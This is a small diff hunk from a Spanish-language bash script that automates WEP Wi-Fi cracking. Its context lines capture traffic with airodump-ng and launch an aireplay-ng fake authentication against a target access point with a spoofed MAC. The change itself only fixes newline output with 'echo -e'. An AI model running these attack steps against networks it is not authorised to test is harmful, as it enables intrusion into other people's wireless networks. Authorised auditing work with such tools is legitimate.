@@ -143,7 +143,7 @@ if [ "$(id -g)" -eq 0 ]; then
 	(xterm -e airodump-ng --encrypt WEP -a --channel $CHANNEL --bssid $BSSID --write aire-tmp $IFACE &)
         (while true; do
 		echo Esperando a sintonizar el canal... && sleep 2 && echo done.
-                echo "Lanzando la falsa autenticacion...\n(presione ctrl+c sobre la ventana para cerrarla)"
+                echo -e "Lanzando la falsa autenticacion...\n(presione ctrl+c sobre la ventana para cerrarla)"
                 (xterm -hold -e aireplay-ng --fakeauth=6000 -o 1 -q 10 -e $ESSID -a $BSSID -h $NEWMAC $IFACE &)
                 echo -n "Ha funcionado la falsa autenticacion? (Y/n) "
                 read RES
